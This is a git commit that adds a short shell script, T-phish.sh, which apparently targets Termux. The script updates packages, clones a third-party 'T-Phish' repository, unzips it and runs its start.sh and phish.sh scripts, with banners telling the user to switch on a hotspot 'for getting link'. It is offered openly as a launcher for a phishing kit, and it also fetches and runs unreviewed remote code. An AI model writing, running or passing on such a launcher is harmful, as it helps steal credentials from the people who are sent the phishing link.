a5346346084c2af682e764481aaa9974fa30ccf8
IT-Tejas <65008967+IT-Tejas@users.noreply.github.com>
2020-06-20 22:20:22 +0530

    T-phish.sh

---
+++ T-phish.sh
@@ -0,0 +1,12 @@
+apt update && apt upgrade
+pkg install figlet
+figlet Starting!!
+git clone https://github.com/Stephin-Franklin/T-Phish
+cd T-Phish
+unzip T-phish.zip
+cd T-Phish
+chmod +x start.sh
+figlet Please switch on hotspot for getting link
+./start.sh
+./phish.sh
+figlet Thankyou!
